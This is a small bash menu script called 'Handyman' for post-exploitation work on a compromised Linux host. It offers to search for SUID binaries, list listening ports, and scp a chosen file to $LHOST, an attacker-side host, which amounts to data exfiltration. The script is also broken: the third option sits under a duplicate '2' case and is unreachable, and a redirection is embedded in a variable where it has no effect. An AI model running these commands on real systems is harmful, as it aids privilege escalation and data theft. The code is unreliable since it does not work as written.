#! /bin/bash

COMMAND_1='find / -perm -u=s -type f 2>/dev/null'
COMMAND_2='ss -tulpn'
COMMAND_3='scp $FILE_TO_SEND $LHOST'

show_menus() {
  clear
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "                                Handyman                                      "
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "  1) $COMMAND_1"
  echo "  2) $COMMAND_2"
  echo "  3) $COMMAND_3"
  echo ""
  echo "  x. Exit"
  echo ""
}

run() {
  $1 
  exit 0
}

read_options() {
  local choice
  read -p "Enter choice " choice
  case $choice in
    1) run $COMMAND_1;;
    2) run $COMMAND_2;;
    2) run $COMMAND_3;;
    x) exit 0;;
    *) echo -e "Error..."
  esac
}

do_menu() {
  while true
  do
    show_menus
    read_options
  done
}

do_menu
